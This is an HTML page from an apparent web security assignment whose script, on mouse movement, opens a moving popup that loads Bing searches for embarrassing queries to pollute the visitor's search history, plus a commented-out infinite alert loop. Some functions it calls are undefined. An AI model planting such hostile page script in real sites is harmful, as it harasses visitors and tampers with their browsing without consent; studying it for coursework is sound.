<html lang="en">
<meta charset="utf-8">
<head>
    <title>
        websec_assignment2
    </title>
</head>
<body>
<script>
  const SEARCHES = [
  'where should i bury the body',
  'why does my eye twitch',
  'why is my poop green',
  'why do i feel so empty',
  'why do i always feel hungry',
  'why do i always have diarrhea',
  'why does my anus itch',
  'why does my belly button smell',
  'why does my cat attack me',
  'why does my dog eat poop',
  'why does my fart smell so bad',
  'why does my mom hate me',
  'why does my pee smell bad',
  'why does my poop float',
  'proof that the earth is flat'
]
    var index_s
    //infinite alert loop
    //while (true) {
        //for (let i = 0; i < 10000; i++) {
            //alert(i)
        //}
    //}

    //open a new window, move it around and change your search history once your mouse moved
    window.addEventListener("mousemove", () => {
        const win = window.open('', '', 'width=100,height=100')
        win.moveTo(10, 10)
        win.resizeTo(200, 200)
        let i = 0
        setInterval(() => {
            win.moveTo(i, i)
            i = (i + 5) % 500
        }, 100)
        index_s = Math.floor((Math.random() * 10) + 1)
        setupSearchWindow(win)
    })

  function setupSearchWindow (win) {
  if (!win) return
  let searchIndex = 1
  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[index_s])
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}

    

</script>
</body>
</html>
